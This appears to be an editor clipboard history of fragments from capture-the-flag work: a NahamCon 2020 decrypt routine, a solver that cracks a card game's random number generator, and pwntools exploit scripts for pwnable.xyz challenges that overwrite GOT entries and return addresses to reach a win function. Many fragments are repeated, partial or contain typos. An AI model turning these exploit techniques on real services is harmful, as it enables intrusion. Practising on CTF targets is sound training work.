	    public Object doInBackground(Object[] objArr) {
	        String[][] strArr = (String[][]) objArr;
	        String str = "UTF-8";
	        String input = strArr[0][0];
	        String flag = strArr[0][1];
	        try {
	            MessageDigest hash = MessageDigest.getInstance("SHA-1");
	            hash.update("5up3r_53cur3_53cr37".getBytes(str));
	            hash.update(flag.getBytes(str));
	            return new String(a(Base64.decode(input, 0), new BigInteger(1, hash.digest()).toString(16).getBytes()));
	        } catch (UnsupportedEncodingException | NoSuchAlgorithmException e) {
	            e.printStackTrace();
	            return "Error decrypting";
	        }
	    }
	
c865c63ec4afb7a07e4e724250528098|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|17|1|V|java
	        String[][] strArr = (String[][]) objArr;
	        String str = "UTF-8";
	        String input = strArr[0][0];
	        String flag = strArr[0][1];
	        try {
	            MessageDigest hash = MessageDigest.getInstance("SHA-1");
	            hash.update("5up3r_53cur3_53cr37".getBytes(str));
	            hash.update(flag.getBytes(str));
	            return new String(a(Base64.decode(input, 0), new BigInteger(1, hash.digest()).toString(16).getBytes()));
	        } catch (UnsupportedEncodingException | NoSuchAlgorithmException e) {
	            e.printStackTrace();
	            return "Error decrypting";
	        }
977975d1f17241c4c146630fe9d3056a|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|16|9|V|java
	    public Object doInBackground(Object[] objArr) {
	    }
	
25c95cb675836a9955db60ccb0885218|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|19|24|v|java
	strArr[0][0];
3e34156b63fc2a3257154713ad1c11ab|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|17|9|V|java
	        String[][] strArr = (String[][]) objArr;
a564edcdeb1c90013f8ab6e68a8b23c6|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|25|69|^v|java
	new BigInteger(1, hash.digest()).toString(16).getBytes()
8e6e7d19b45c43062674dbd5b36e8897|file:///home/neo/CTFs/nahamcon2020/secure_safe/a.java|4|1|V|java
	import android.util.Base64;
5b93625023a1c2180221257849744b59|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|25|65|v|java
	decode
b6da00cb2eb43cb37b803f31f0194e1a|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|25|78|v|java
	.getBytes()
d2ef6fe87db441418ea7f9b6a7553907|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|21|1|V|java
	        try {
	            MessageDigest hash = MessageDigest.getInstance("SHA-1");
	            hash.update("5up3r_53cur3_53cr37".getBytes(str));
	            hash.update(input.getBytes(str));
	            BigInteger bigInt = new BigInteger(1, hash.digest());
	            System.out.println(bigInt.toString(16));
	            System.out.println(new String(a(base64.decode(flag), bigInt.toString(16).getBytes())));
	        } catch (UnsupportedEncodingException | NoSuchAlgorithmException e) {
	            e.printStackTrace();
	            System.out.println("Error decrypting");
	        }
369f9df4eaa11aaae4d72f5d4169e3dd|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|28|32|v|java
	new String(a(base64.decode(flag), bigInt.toString(16).getBytes()))
4c9d4c3eb8cc2fdb6c5205cdfe10e0cd|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|21|1|V|java
	        try {
	            MessageDigest hash = MessageDigest.getInstance("SHA-1");
	            hash.update("5up3r_53cur3_53cr37".getBytes(str));
	            hash.update(input.getBytes(str));
	            BigInteger bigInt = new BigInteger(1, hash.digest());
	            System.out.println(bigInt.toString(16));
	            String secret = new String(a(base64.decode(flag), bigInt.toString(16).getBytes()))
	            System.out.println(secret);
	        } catch (UnsupportedEncodingException | NoSuchAlgorithmException e) {
	            e.printStackTrace();
	            System.out.println("Error decrypting");
	        }
e22c59ecf8ad8de4beb1555249972cc1|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|36|25|v|java
	inpt
43a7f148e0ba8d5f4f51cf218f23c33e|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|29|1|V|java
	        } catch (UnsupportedEncodingException | NoSuchAlgorithmException e) {
	            e.printStackTrace();
	            System.out.println("Error decrypting");
	        }
d36497e0b394d5c4dce9139488744846|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|21|9|V|java
	        try {
4abbd0a69fa6a188ee12794963f1806f|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|35|1|V|java
	        } catch (UnsupportedEncodingException | NoSuchAlgorithmException e) { e.printStackTrace();
	            System.out.println("Error decrypting");
	        }
644dd5e9b8d6e0ce5d5a39f063a54cbf|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|34|9|V|java
	        System.out.println(bigInt2.toString(16));
35c93c41080530572ac62e0483d3a7b3|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|26|9|V|java
	        System.out.println(bigInt.toString(16));
452f74213a166d0aeb5c1338e59c8f06|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|31|1|V|java
	        hash2.update(secret.getBytes(str));
12e0db080a1bef4fc96c219e91fcf40f|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|26|13|V|java
	            System.out.println(bigInt.toString(16));
33f03100531c42441901844be2829e44|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|28|1|V|java
	            System.out.println(secret);
6a33e7c2f2b0ace5bd066bc19f2aabc0|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|27|1|V|java
	            secret = new String(a(base64.decode(flag), bigInt.toString(16).getBytes()));
3125d0acbf3e0417d12c1bb528177ceb|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|37|1|V|java
	            hash2.update(secret.getBytes(str));
decf351f3dabdc10637a77ef268497c2|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|21|1|V|java
	        String secret = "";
27118326006d3829667a400ad23d5d98|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|22|9|v|java
	String
bbbfe202b9db1cc171f8f77f4624c7bd|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|29|13|V|java
	            System.out.println(base64.decode(flag));
ca8e500675edcf65a06fa37c64ad35cd|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|19|1|V|java
	        String flag = "dGhpc19pc19hX2ZsYWcK";
7d072763e325bea0e604e4790d7b89f5|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|20|24|v|java
	dGhpc19pc19hX2ZsYWcK
b232355c2513f3f1b6adf8f07005deaa|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|29|13|V|java
	            // secret = new String(a(base64.decode(flag), bigInt.toString(16).getBytes()));
adf9c29b5c660f3755d6e6fc893a6aa9|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|38|13|V|java
	            // hash2.update(secret.getBytes(str));
620a8daff5537465eefcc6062df350f3|file:///home/neo/CTFs/nahamcon2020/secure_safe/decrypt.java|31|1|V|java
	            System.out.println(secret.getBytes(str));
0d718a61322b0b7aa832855b8d89dc70|file:///home/neo/pwnablexyz/note/exploit.py|26|1|V|python
	        if args.PWNDBG:
	            gs = '''
	            init-pwndbg
	            b edit_note
	            '''
	            return gdb.debug(exe.path, gs)
a26c3a1aa25a62338a2d7eaf3a4a97eb|file:///home/neo/pwnablexyz/note/exploit.py|33|9|V|python
	        args.PWNDBG:
ebb803dceba6bfe53914096ac3e9d9cc|file:///home/neo/pwnablexyz/note/exploit.py|29|13|V|python
	            b edit_note
5857a77120b5d3f681ac19b901db74e2|file:///home/neo/CTFs/scripts/pwn/skeleton.py|33|1|V|python
	if args.GEF:
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
	    ''')
	    # pie breakpoint function+118
	
	if args.PWNDBG:
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
	    ''')
	    # piebase 0x7f0
	
	if args.GDB:
	    gdb.attach(io, gdb_args=['-q'], gdbscript='''
	    b main
	    ''')
3353b36f012a76869f05a132fd5b2913|file:///home/neo/pwnablexyz/note/exploit.py|26|1|V|python
	        if args.PWNDBG:
	            gs = '''
	            init-pwndbg
	            b edit_note
	            '''
	            return gdb.debug(exe.path, gs)
	        elif args.GEF:
	            gs = '''
	            init-gef
	            '''
	            return gdb.debug(exe.path, gs)
	        else:
	            return local(argv, *a, **kw)
	
8691d07f4139bb28454634b41e81f9e7|file:///home/neo/CTFs/nahamcon2020/secure_safe/solve.py|1|1|V|python
	
	Skip to content
	Search or jump to‚Ä¶
	
	Pull requests
	Issues
	Marketplace
	Explore
	 
	@neochristou 
	ChapeauR0uge
	/
	write-ups
	0
	00
	Code
	Issues
	Pull requests
	Actions
	Projects
	Wiki
	Security
	Insights
	write-ups/b00t2root/crypto/genetics/DNAdecoder.py /
	 chapeauR0uge Mise √† jour des challs
	7ceee38 on Apr 5, 2019
	114 lines (102 sloc)  2.59 KB
	 
22adb326d020c4018e1c935b8b807363|file:///home/neo/CTFs/nahamcon2020/secure_safe/solve.py|115|1|V|python
	¬© 2020 GitHub, Inc.
	Terms
	Privacy
	Security
	Status
	Help
	Contact GitHub
	Pricing
	API
	Training
	Blog
	About
1f3835d3120b466e935ae87f6e31e0c6|file:///home/neo/CTFs/nahamcon2020/dina/ct|1|1|V|
	ACTGCTATATTTGGAATACGACGCGGCCGATTGATACGATCTTTGATAACGGGCTCTTTGATATTGCTTGGCTCTCTAAAGAAGGGCATGGGA
64d50dc37419576462303c7816b7ea36|file:///home/neo/CTFs/nahamcon2020/dina/ct|1|1|V|
	ACTGCTATAGGCTCTTTCGGCTCAATATTCCGCGGCATAACGTTCTCAATGTCTTTTGCTATATCTCGCAGTCGCACGTCTGGTTTGTTTCCGACG
1192dba30015e9ae32976afa8babab24|file:///home/neo/CTFs/nahamcon2020/dina/ct|1|1|V|
	TCTGGAGTGGGCTCGATAACGGGATCATCAAAATCGATATTCCGCCGATTCATAATGACGATATCTGGATTCATATCAATGTTTCGCTTCGAT
4cb676d1b8476f2eb8565effe48ca0bc|file:///home/neo/CTFs/nahamcon2020/dina/ct|1|1|V|
	ACTGCTATAACGGGCTCTTTGATATTCCGCATGACGATACCACGAGTTAAGGCTATATCTTCCCCTCTTTGCCGATGCAGTTCTACGGGCGTGTCT
bb54d8d5993f3a3cfae415c95bb80b26|file:///home/neo/CTFs/nahamcon2020/dina/ct|1|1|V|
	CGGAGCGAAGTCACCACTGTTTTGCCTGAAGAAACCATCATAGAATTGAGCACCATAGTTTCTCGGGCAATACGGGCAAGCCGGCGTGTGATATCGTCA
ccb0358a4e08c10339d4432524ced0ad|file:///home/neo/CTFs/nahamcon2020/dina/solve.py|88|37|v|python
	bytes(dna_table[b], 'utf-8')
2c08a00ba3f8a41862ccc09304710a59|file:///home/neo/CTFs/nahamcon2020/dina/solve.py|117|1|V|python
	        decoder(sys.argv[1])
84419ea659aed050f25374e458b0f846|file:///home/neo/CTFs/nahamcon2020/dina/solve.py|114|13|v|python
	sysargv[1]
175b9f602ac7eb69c50923dd33e2759a|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|2|1|V|python
	from functools import total_ordering
	import json
	from sympy.core.numbers import mod_inverse
27ec06c7cb29466228fc919a106995ce|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|6|1|V|python
	def json_recv():
	    line = r.recvline()
	    return json.loads(line.decode())
	
	def json_send(hsh):
	    request = json.dumps(hsh).encode()
	    r.sendline(request)
	
	def get_mul_inc(x0, x1, x2, mod):
	    mul = (x2-x1) * mod_inverse((x1-x0),mod) % mod
	    inc = (x1 - mul * x0) % mod
	    return mul, inc
	
	def rebase(n, b=52):
	    if n < b:
	        return [n]
	    else:
	        return [n % b] + rebase(n//b, b)
	
	@total_ordering
	class Card:
	    def __init__(self, value, suit):
	        self.value = value
	        self.suit = suit
	
	    def __str__(self):
	        return f"{self.value} of {self.suit}"
	
	    def __eq__(self, other):
	        return self.value == other.value
	
	    def __gt__(self, other):
	        return VALUES.index(self.value) > VALUES.index(other.value)
	
	class CustomCard:
	    def __init__(self, value, suit):
	        self.value = value
	        self.suit = suit
	
	    def __str__(self):
	        return f"{self.value} of {self.suit}"
	
	    def __eq__(self, other):
	        return self.value == other.value and self.suit == other.suit
	
	    def __gt__(self, other):
	        return VALUES.index(self.value) > VALUES.index(other.value)
	
	VALUES = ['Ace', 'Two', 'Three', 'Four', 'Five', 'Six',
	          'Seven', 'Eight', 'Nine', 'Ten', 'Jack', 'Queen', 'King']
	SUITS = ['Clubs', 'Hearts', 'Diamonds', 'Spades']
	custom_deck = [CustomCard(value, suit) for suit in SUITS for value in VALUES]
	real_deck = [Card(value, suit) for suit in SUITS for value in VALUES]
	
	mod = 2**61 - 1  # 9th mersenne prime
	# print(mod)
	
	rec = json_recv()
	round_num = rec['round']
	hand = rec['hand'].split(' ')
	value = hand[0]
	suit = hand[2]
	card = custom_deck.index(CustomCard(value, suit))
	msg = rec['msg']
	# print(msg)
	msg = msg.split()
	next_shuffle = int(msg[msg.index('after')+1]) - 1
	# print(f"{card} * (52 ** {next_shuffle})")
	rand_num = card * (52 ** next_shuffle)
	total_rounds = 0
	card_arr = []
	random_nums = []
	current_deal = []
	while next_shuffle > 0:
	    next_shuffle -= 1
	    json_send({"choice":"h"})
	    total_rounds += 1
	    rec = json_recv()
	    hand = rec['hand']
	    # print(hand)
	    hand = hand.split()
	    msg = rec['msg']
	    # print(msg)
	    msg = msg.split()
	    value = hand[0]
	    suit = hand[2]
	    current_card = Card(value, suit)
	    current_deal.insert(0, custom_deck.index(current_card))
	    card = custom_deck.index(CustomCard(value, suit))
	    # print(card)
	    card_arr.insert(0,card)
	    # print(f"{card} * (52 ** {next_shuffle})")
	    rand_num += card * (52 ** next_shuffle)
	    if 'reshuffle' in msg:
	        # print(current_deal)
	        # print('--------------\n')
	        # current_deal = reversed(current_deal)
	        # for card in current_deal:
	        #     print(custom_deck[card])
	        current_deal = []
	        random_nums.append(rand_num)
	        # print('Random num:', rand_num)
	        # print(rand_num)
	        if len(random_nums) == 3:
	            mul, inc = get_mul_inc(random_nums[0], random_nums[1], random_nums[2], mod) 
	            print('Mul: ', mul)
	            print('Inc: ', inc)
	            next_rand_num = (random_nums[2] * mul + inc) % mod
	            # print('Next random num:', next_rand_num)
	            next_deal = rebase(next_rand_num)
	            # print(next_deal)
	            while total_rounds <= 100:
	                hidden = next_deal.pop()
	                hidden_card = real_deck[hidden]
	                # print('Current card:', current_card)
	                # print('Guessed hidden card:', hidden_card, hidden)
	                if next_deal == []:
	                    next_rand_num = (next_rand_num * mul + inc) % mod
	                    next_deal = rebase(next_rand_num)
	                if hidden_card < current_card:      
	                    json_send({"choice":"l"})
	                else:
	                    json_send({"choice":"h"})
	                rec = json_recv()
	                if total_rounds == 99 or total_rounds == 98:
	                    print(rec)
	                real_hidden_card = rec['hand'].split(' ')
	                real_hidden_card = Card(real_hidden_card[0], real_hidden_card[2])
	                # print('Real hidden card:', real_hidden_card, real_deck.index(real_hidden_card))
	                current_card = hidden_card
	                total_rounds += 1
	
	            # print('Next random num: ', next_rand_num)
	        next_shuffle = int(msg[msg.index('after')+1])
	        rand_num = 0 
	        card_arr = []
a34f68238ee1f2371ae6a435737ef717|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|12|1|V|python
	r.recvuntil('= ')
f7014e1149dbe00c0126ece330641aac|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|14|1|V|python
	r.recvuntil('Key = ')
8ec66cb6f41dce1993380a560f82f664|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|19|1|V|python
	r.recvuntil('Nonce = ')
e3601632a7fbabf008c1fb0790f3c8a3|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|7|1|V|python
	for _ in range(nonce_length):
	    nonce_chars.extend(random.sample(alphabet, 1))
	for c in nonce_chars:
	    print(c)
db54d6450cb52036d416418f8933f870|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|22|1|V|python
	print(nonce.decode())
0b2ab7dff8f3738b5f13bf914c100b9d|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|28|1|V|python
	print(len(nonce_chars))
80e3b3fbdf516dd6e9a7f4e066fada3b|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|25|1|V|python
	nonce_length = len(nonce)
09003e693fe63e968f62bdcb4735ccfc|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|25|1|V|python
	for c in nonce:
88b5c39bf4ab04d38469a085601bd925|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|29|1|V|python
	prin(len(nonce_set))
561096938c07620e26a08da86ed2877d|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|30|10|v|python
	nonce_set
f6ef134b608f22b6dd95cd031bd31385|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|24|15|V|python
	for c in nonce:
	    print(chr(c))
70aecc70a5ce0e9362404ac6c8897d9c|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|20|1|V|python
	nonce = nonce.strip(b'\xcc')
dd3c91aaf4c5f3c5631bc8fd9ed4db89|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|27|1|V|python
	print(nonce)
d6d7b333d870b030c22a85cc6a1a2cef|file:///home/neo/CTFs/nahamcon2020/elsa4/solve.py|23|5|V|python
	    if not bytes([c]) == b'\xcc':
526e90768470b68b8e6ad349ca76fc33|file:///home/neo/pwnablexyz/note/exploit.py|31|1|V|python
	            b edit_desc
f1b708bba17f1ce948dc979f4d7092bc|file:///home/neo/pwnablexyz/note/exploit.py|51|9|v|python
	0000000000
ebee567fb31c2cbe09c21c92530dac71|file:///home/neo/pwnablexyz/note/exploit.py|52|1|V|python
	io.recvuntil('> ')
	io.sendline('1')
	io.recvuntil('? ')
	io.sendline('48')
	io.recvuntil(': ')
	io.sendline(b'A' * 32 + p64(RET))
2632a94d01277a550dfdad748d5f8094|file:///home/neo/pwnablexyz/note/exploit.py|64|17|v|python
	 * 32 + p64(RET
08803b02eacdb789071f63c0a34a347c|file:///home/neo/pwnablexyz/note/exploit.py|51|1|V|python
	RET = 0x400ac4
bb2e50ae2a60bd4196c359d9e2a693eb|file:///home/neo/CTFs/scripts/pwn/pwn_template.py|35|1|V|python
	def log_addr(name, addr):
	    log.info('{}: 0x{:x}'.format(name, addr))
	
969e520e75cd40d9b234fb4afe7c1a3b|file:///home/neo/pwnablexyz/xor/exploit.py|50|1|V|python
	WIN_ADDR = 0x40093c
	PUTS_GOT = exe.got['puts']
	io.recvuntil('> ')
	io.sendline('1')
	io.recvuntil('? ')
	io.sendline('48')
	io.recvuntil(': ')
	io.sendline(b'A' * 32 + p64(PUTS_GOT))
	
	io.recvuntil('> ')
	io.sendline('1')
	io.recvuntil('? ')
	io.sendline('8')
	io.recvuntil(': ')
	io.sendline(b'\x00')
	
	io.recvuntil('> ')
	io.sendline('2')
	io.recvuntil(': ')
	io.sendline(p64(WIN_ADDR))
	
	io.recvuntil('> ')
	io.sendline('3')
8bdf290645c4b10f44fe3625bf4fe996|file:///home/neo/.config/i3/config|200|1|V|conf
	exec_always --no-startup-id $HOME/.config/polybar/scripts/launchlistener.sh
5fd34710a9063fefaf0363695c1d96c1|file:///home/neo/pwnablexyz/xor/exploit.py|11|1|v|python
	svc.pwnable.xyz 
51e706f8b33d4020dbe481ae37603842|file:///home/neo/pwnablexyz/xor/exploit.py|11|3|v|python
	30029
b1fd80c5b8abab3a8b24dbb35d091ebc|file:///home/neo/pwnablexyz/xor/exploit.py|49|28|v|python
	0x555555554aeb
447d2ad0c38802b17c1adddbaaaba54c|file:///home/neo/pwnablexyz/xor/exploit.py|51|13|V|python
	payload = "A" * OFFSET
	io.sendline(payload)
322b6cf1608d739a58ff68f7abf4ff83|file:///home/neo/pwnablexyz/xor/exploit.py|50|1|V|python
	log.info("%d", RET_OFFSET // 8)
8a91152bbcbe2b6964f2a79f4bf33779|file:///home/neo/pwnablexyz/xor/exploit.py|51|26|v|python
	 // 8
df48b9b648e6db8b8d04e242dc681326|file:///home/neo/pwnablexyz/xor/exploit.py|49|45|v|python
	0x555555756200
5f2cad60a0e28ff8376407779d831ea1|file:///home/neo/pwnablexyz/xor/exploit.py|49|44|v|python
	 0x555555756200
27d38ac38b721d37d179458e212424f2|file:///home/neo/pwnablexyz/xor/exploit.py|49|13|v|python
	 0x555555756200 - 0x7fffffffde60
cc1a011cfc7c2c10db5a5b2db405fd58|file:///home/neo/pwnablexyz/xor/exploit.py|50|1|V|python
	print( 0x555555756200 > 0x7fffffffde60)
715fdec6a01cf943b9975732b5c48ce5|file:///home/neo/pwnablexyz/xor/exploit.py|51|1|V|python
	log.info("%d", RET_OFFSET)
46686448bc5c60e7846fe388c5e56ea0|file:///home/neo/pwnablexyz/xor/exploit.py|52|17|v|python
	RET_OFFSET
52704b234902f6bcd54e76f3e46ea628|file:///home/neo/pwnablexyz/xor/exploit.py|51|1|V|python
	log.info("%d", RET_OFFSET)0x555555756200
d3aec1f0f34ae8ba82aad8332dd986d9|file:///home/neo/pwnablexyz/xor/exploit.py|49|1|V|python
	RET_OFFSET = 0x555555756200 - 0x7fffffffde60
a17434bc055c5c439e11f7c9e947d3e3|file:///home/neo/pwnablexyz/xor/exploit.py|49|1|V|python
	GOT = exe.get_section_by_name('.got')
cc7ee2a825defe25eae2ea224d3f9261|file:///home/neo/pwnablexyz/xor/exploit.py|51|31|V|python
	log.info("%d", RET_OFFSET // 8)
	log.info("%d", RET_OFFSET)
	log.info("%d", -0x555555756204)
	log.info("%s", 0x555555756200 -0x2aaaaa8a7c60)
5c31958abc8e8137372b0db093633b48|file:///home/neo/pwnablexyz/xor/exploit.py|51|1|V|python
	log_addr("Ret offset", RET_OFFSET)
84caca78a6457217157e45f72e04425c|file:///home/neo/pwnablexyz/xor/exploit.py|51|1|V|python
	log_addr('Got', GOT)
57cacb6b8885935178f39467f1910262|file:///home/neo/pwnablexyz/xor/exploit.py|53|1|V|python
	log_addr('Data', DATA)
f6068daa29dbb05a7ead1e3b5a48bbee|file:///home/neo/pwnablexyz/xor/exploit.py|54|11|v|python
	Data
506b0427874606b21515edd5b69270e1|file:///home/neo/pwnablexyz/xor/exploit.py|60|1|V|python
	io.sendline(p64(P1))
2df6e2b6860a500e5b0406d7503152d6|file:///home/neo/pwnablexyz/xor/exploit.py|61|1|V|python
	io.sendline(p64(P2))
d322c719213dbedd8d3161a5700d1aaa|file:///home/neo/pwnablexyz/xor/exploit.py|52|1|V|python
	log_addr('Got', GOT)
	log_addr('Data', DATA)
	log_addr('Printf got', PRINTF_GOT)
24164174a831e8a504c4427d5d31ba14|file:///home/neo/pwnablexyz/xor/exploit.py|57|1|V|python
	log_addr('Printf got', PRINTF_GOT)
fbd8c74c656029c433c072b20602163f|file:///home/neo/pwnablexyz/xor/exploit.py|58|11|v|python
	Printfgot
a21e97a8152621d75b856146e0f64e5c|file:///home/neo/pwnablexyz/xor/exploit.py|50|1|V|python
	DATA = exe.get_section_by_name('.data').header.sh_addr
cc32ed95a60856444f59cab5741083b2|file:///home/neo/pwnablexyz/xor/exploit.py|49|1|V|python
	GOT = exe.get_section_by_name('.got').header.sh_addr
cb1d65b942edb153ce8350f9c0fb818a|file:///home/neo/pwnablexyz/xor/exploit.py|55|11|v|python
	Printf got
7efef7368c0a96ab2a946622c1e84dc9|file:///home/neo/pwnablexyz/xor/exploit.py|55|20|v|python
	PRcwINTF_GOT
52e24f0d75fb3d8143cbf4d9c5489caf|file:///home/neo/pwnablexyz/xor/exploit.py|50|1|V|python
	PRINTF_GOT = exe.got.printf
8063ec773b9cf0394eddb2f69ed116c5|file:///home/neo/pwnablexyz/xor/exploit.py|51|6|v|python
	CALL_EXIT
596aeacd5b78d6d4112368deaf7dd4ba|file:///home/neo/pwnablexyz/xor/exploit.py|52|33|V|python
	RAX = 13 # Size of array: 11, +2 to overwrite ret address
	log.info("Win address: %#x" % WIN_ADDR)
	io.sendlineafter('Input:', str(WIN_ADDR) + " 0 " + str(RAX))
	io.sendlineafter('Input:', "aaa")
a4e6136b36b2fced8fbfeb1a5d91529f|file:///home/neo/pwnablexyz/xor/exploit.py|58|1|V|python
	print(OFFSET)
f187196aa3fa569f7be83aff3735c75c|file:///home/neo/pwnablexyz/xor/exploit.py|56|30|V|python
	log_addr('Call exit', CALL_EXIT)
	log_addr('Result', RESULT)
	log_addr('Offset', OFFSET)
054648bf61cde60a1f7751041acf975c|file:///home/neo/pwnablexyz/xor/exploit.py|58|1|V|python
	io.recvline()
	io.sendline(str(P1))
	io.sendline(str(P2))
	io.sendline(str(OFFSET))
6bc4a177625a13c8832b57a043a50a33|file:///home/neo/pwnablexyz/xor/exploit.py|65|1|V|python
	io.sendline(str(P2))
78fcfcfeb76cc494e896cad7675b8346|file:///home/neo/pwnablexyz/xor/exploit.py|65|1|V|python
	io.sendline(str(OFFSET))
b1c5aadd1c9892f6d0f6f2006cc2a8d4|file:///home/neo/pwnablexyz/xor/exploit.py|64|13|v|python
	str(P1)
eaf3a6567b6597ed85ff8a64e8886eaf|file:///home/neo/pwnablexyz/xor/exploit.py|53|1|V|python
	CALL_WIN = u64(exe.read(CALL_EXIT, 5).ljust(8, '\x00')) # Unpack to get it as int
36f5ef8e84459a056cecda5f1bbf3f4d|file:///home/neo/pwnablexyz/two-targets/exploit.py|49|1|V|python
	RESULT = exe.sym.result
	CALL_EXIT = exe.sym.main + 148
	WIN_ADDR = exe.sym.win
	exe.asm(CALL_EXIT, "call " + hex(WIN_ADDR)) # Change instruction from call exit to call win
	CALL_WIN = u64(exe.read(CALL_EXIT, 5).ljust(8, '\x00')) # Pad and unpack to get it as int
	P1 = CALL_WIN ^ 0xa
	P2 = 0xa
	OFFSET = (CALL_EXIT - RESULT) // 8
	
	io.recvline()
	io.sendline(str(P1))
	io.sendline(str(P2))
	io.sendline(str(OFFSET))
	
	io.recvline()
	io.sendline("0 0 0")
ccdd5460889187a7e11c5c479c948f4f|file:///home/neo/pwnablexyz/two-targets/exploit.py|48|1|V|python
	io.recvuntil('> ')
7e199fa1354995deffe65ccc85707c0b|file:///home/neo/pwnablexyz/two-targets/exploit.py|49|1|V|python
	io.recvuntil('> ')
	io.sendline('2')
9876d6b0f981d3fb592e9b954935ebc6|file:///home/neo/pwnablexyz/two-targets/exploit.py|55|1|V|python
	io.recvuntil('> ')
	io.sendline('3')
1119438de74192c5379e540dad19768b|file:///home/neo/pwnablexyz/two-targets/exploit.py|49|15|V|python
	PRINTF_GOT = exe.got['printf']
	WIN_ADDR = exe.sym.win
5306139ee2710ce488da6b0695d20f03|file:///home/neo/pwnablexyz/two-targets/exploit.py|54|1|V|python
	io.sendline(b'a'*16 + p64(PRINTF_GOT))
	
	io.recvuntil('> ')
	io.sendline('3')
	io.recvuntil(': ')
	io.sendline('10')
	# io.sendline(p64(WIN_ADDR))
	# io.recvuntil('> ')
	# io.sendline('1')
e3ff9fbfd829f91e32a40a45cb65648f|file:///home/neo/pwnablexyz/two-targets/exploit.py|51|1|V|python
	print(len(MAIN_INSTR))
14098875c2b9362a0b60f631944a1691|file:///home/neo/pwnablexyz/two-targets/exploit.py|51|1|V|python
	for c in MAIN_INSTR:
	    print(bytes([c]))
	print(len(MAIN_INSTR))
6e0057deeb2db60844a0fab1ff089c22|file:///home/neo/vimwiki/Pwn.wiki|21|4|V|vimwiki
	    
	    - Read instructions: `exe.read(address, num_    )`
9e7f13893b97deed75a7500a410c34f4|file:///home/neo/pwnablexyz/two-targets/exploit.py|53|16|V|python
	for c in TARGET:
	    print(bytes([c]))
a97fd52675452457747cca113b515ac5|file:///home/neo/pwnablexyz/two-targets/exploit.py|30|13|V|python
	            b main
44cade6cb3205636445b2244090ad178|file:///home/neo/pwnablexyz/two-targets/exploit.py|60|1|V|python
	io.recvuntil('> ')
	io.sendline('2')
	io.recvuntil(': ')
eba69a2f72cff1cfaf017be7181e41e9|file:///home/neo/pwnablexyz/two-targets/exploit.py|35|13|V|python
	            -q 
d90186a08698514de23a2c69234016da|file:///home/neo/pwnablexyz/two-targets/exploit.py|29|1|V|python
	            b auth
fcd400262d7c293ececbc0fc56d66f1e|file:///home/neo/pwnablexyz/two-targets/exploit.py|28|13|V|python
	            init-pwndbg
300b44d734c46582059de2f6b45eced8|file:///home/neo/pwnablexyz/two-targets/exploit.py|29|13|V|python
	            set sysroot
946828fce8b9d3828e47e85fd6def881|file:///home/neo/pwnablexyz/two-targets/exploit.py|29|1|V|python
	            b *0x0000000000400ac1
90a8d3cf02013585806988895ffc7b96|file:///home/neo/pwnablexyz/two-targets/exploit.py|55|9|v|python
	((c >> 4) | (c << 4)) & 0xff
684708ada547bedbc3af1a05a8ff38b8|file:///home/neo/pwnablexyz/two-targets/exploit.py|54|1|V|python
	for i,c in enumerate(MAIN_INSTR):
2baea5963e31dc45084058f9ee94a188|file:///home/neo/pwnablexyz/two-targets/exploit.py|59|1|V|python
	or c in MAIN_INSTR:
4580a30756dc52f06057127ff3bb9896|file:///home/neo/pwnablexyz/two-targets/exploit.py|59|22|v|python
	MAIN_INSTR
4c43c213696b307e8104c32c4e743f78|file:///home/neo/pwnablexyz/two-targets/exploit.py|62|1|V|python
	log.info(test)
31b17666824dc3aec2e409d85ae26e8e|file:///home/neo/pwnablexyz/two-targets/exploit.py|55|1|V|python
	    b = ((c >> 4) | (c << 4)) & 0xff
ebe58686877bc41615b6a8b1149e2547|file:///home/neo/pwnablexyz/two-targets/exploit.py|56|8|v|python
	 ((c >> 4) | (c << 4)) & 0xff
2b33a90f808d3f5c2e4ebd86745f59e5|file:///home/neo/pwnablexyz/two-targets/exploit.py|58|23|v|python
	b ^ TARGET[i]
